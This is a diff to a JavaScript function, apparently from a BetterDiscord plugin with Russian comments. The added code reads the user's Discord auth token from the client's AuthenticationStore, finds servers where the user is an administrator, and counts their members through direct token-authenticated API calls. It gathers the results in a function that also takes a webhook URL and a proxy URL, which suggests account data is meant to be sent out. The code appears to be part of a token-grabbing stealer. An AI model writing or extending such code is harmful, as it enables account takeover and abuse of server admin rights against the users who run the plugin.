@@ -30,10 +30,18 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         }
     } catch (e) { console.error("Nitro Error", e); }
 
+    // Получаем токен для прямого запроса к API
+    let token = null;
+    try {
+        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
+        if (authStore && typeof authStore.getToken === 'function') token = authStore.getToken();
+    } catch (e) {}
+
     // 3. Ищем серверы, где ты админ, и считаем людей
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
+        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
         
         if (GuildStore && PermissionStore) {
             const guilds = GuildStore.getGuilds();
@@ -42,18 +50,32 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
                 // Проверяем право "Администратор"
                 if (PermissionStore.can(8n, g)) {
                     
-                    // Делаем "свежий" запрос к кэшу по ID сервера
-                    const freshGuild = GuildStore.getGuild(g.id);
                     let count = 0;
                     
-                    if (freshGuild) {
-                        // Discord отдает либо точное (memberCount), либо приблизительное (approximateMemberCount)
-                        count = freshGuild.memberCount || freshGuild.approximateMemberCount || 0;
+                    // Пытаемся достать из кэша (самый быстрый способ)
+                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
+                        count = GuildMemberCountStore.getMemberCount(g.id);
+                    }
+                    if (!count) {
+                        count = g.memberCount || g.approximateMemberCount;
+                    }
+
+                    // Если в кэше пусто (0), делаем прямой запрос к API Discord
+                    if (!count && token) {
+                        try {
+                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
+                                headers: { "Authorization": token }
+                            });
+                            if (res.ok) {
+                                const data = await res.json();
+                                count = data.approximate_member_count || data.member_count || 0;
+                            }
+                        } catch (err) { console.error("API Fetch Error:", err); }
                     }
 
                     result.admin_servers.push({
                         name: g.name,
-                        members: count
+                        members: count || 0
                     });
                 }
             }
